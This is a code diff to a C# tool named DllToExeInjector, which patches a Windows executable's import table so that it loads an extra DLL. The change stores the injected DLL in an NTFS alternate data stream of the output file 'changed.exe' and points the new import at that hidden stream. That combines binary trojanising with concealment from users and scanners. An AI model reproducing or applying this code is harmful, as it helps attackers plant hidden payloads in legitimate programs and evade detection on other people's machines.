@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -60,8 +61,10 @@ namespace DllToExeInjector
         
         public void InjectDll(string filePath, string dllPath, string functionName)
         {
+            string injectedDllName = NTFSStreamUtils.GetAlternateStreamName("changed.exe", dllPath);
+
             var file = new PeFile(filePath);
-           
+            
             var newImportsSize = (file.ImageImportDescriptors.Length + 1) * 0x14;
             var newImportsPosition = _FindZeroBlock(file, newImportsSize);
             file.MoveImportTable(newImportsPosition);
@@ -69,11 +72,11 @@ namespace DllToExeInjector
             var newImportDesscriptorOffset = newImportsPosition + (file.ImageImportDescriptors.Length * 0x14);
             var newImportDesscriptor = new IMAGE_IMPORT_DESCRIPTOR(file.Buff, (uint)newImportDesscriptorOffset);
             var dllNameOffset = _FindZeroBlock(file, dllPath.Length + 1, (newImportsPosition + newImportsSize) + 0x14); 
-            for(int i=0; i < dllPath.Length; i++)
+            for(int i=0; i < injectedDllName.Length; i++)
             {
-                file.Buff[i+dllNameOffset] = (byte)dllPath[i];
+                file.Buff[i+dllNameOffset] = (byte)injectedDllName[i];
             }
-            file.Buff[dllNameOffset + dllPath.Length] = 0;
+            file.Buff[dllNameOffset + injectedDllName.Length] = 0;
 
             var functionNameOffset = _FindZeroBlock(file, functionName.Length + 3, dllNameOffset + dllPath.Length + 1);
 
@@ -98,6 +101,7 @@ namespace DllToExeInjector
             file.Buff[importDirectorysSizeOffset + 3] = (byte)((newImportsSize & (0xFF000000)) >> 24);
 
             file.Save("changed.exe");
+            NTFSStreamUtils.CopyToAlternateStream("changed.exe", dllPath);
         }
     }
 }
